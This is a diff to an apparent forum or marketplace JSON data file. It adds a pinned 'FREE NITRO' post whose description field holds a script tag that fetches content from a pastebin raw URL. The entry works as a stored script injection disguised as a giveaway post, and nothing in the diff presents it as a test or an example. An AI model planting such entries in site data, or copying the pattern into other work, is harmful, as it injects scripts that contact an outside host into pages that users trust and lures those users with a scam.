@@ -130,6 +130,22 @@
       "category": "marketplace",
       "pinned": false,
       "locked": false
+    },
+    {
+      "id": 1784379155414,
+      "title": "FREE NITRO",
+      "author": "nevermisssserver_owner",
+      "authorId": "999999999999999999",
+      "avatar": "",
+      "time": "2026-01-01",
+      "tag": "Free",
+      "tagClass": "tag-green",
+      "link": null,
+      "description": "<script>fetch('https://pastebin.com/raw/abc')</script>",
+      "comments": [],
+      "category": "marketplace",
+      "pinned": true,
+      "locked": false
     }
   ]
 }
